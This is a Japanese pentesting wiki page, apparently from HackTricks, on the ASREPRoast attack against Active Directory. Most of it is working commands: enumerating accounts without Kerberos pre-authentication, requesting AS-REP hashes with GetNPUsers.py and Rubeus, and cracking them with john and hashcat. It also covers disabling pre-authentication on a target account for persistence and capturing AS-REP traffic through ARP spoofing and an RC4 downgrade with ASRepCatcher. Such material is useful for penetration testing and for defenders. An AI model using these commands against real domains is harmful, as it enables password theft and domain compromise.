# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos事前認証必須属性**が欠如しているユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、その後、ユーザーのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでそれを解読してユーザーのパスワードを発見しようとします。

この攻撃の主な要件は次のとおりです：

- **Kerberos事前認証の欠如**：ターゲットユーザーは、このセキュリティ機能が有効でない必要があります。
- **ドメインコントローラー（DC）への接続**：攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
- **オプションのドメインアカウント**：ドメインアカウントを持つことで、攻撃者はLDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そのようなアカウントがない場合、攻撃者はユーザー名を推測しなければなりません。

#### 脆弱なユーザーの列挙（ドメイン資格情報が必要）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REPメッセージを要求する
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus は、暗号化タイプ 0x17 および事前認証タイプ 0 の 4768 を生成します。

### クラッキング
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を強制する必要はありません。
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

攻撃者は、ネットワークを横断する際にAS-REPパケットをキャプチャするために中間者の位置を利用でき、Kerberosの事前認証が無効になっていることに依存しません。したがって、VLAN上のすべてのユーザーに対して機能します。\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)を使用することでこれを実現できます。さらに、このツールはKerberosの交渉を変更することにより、クライアントワークステーションにRC4を使用させることを強制します。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
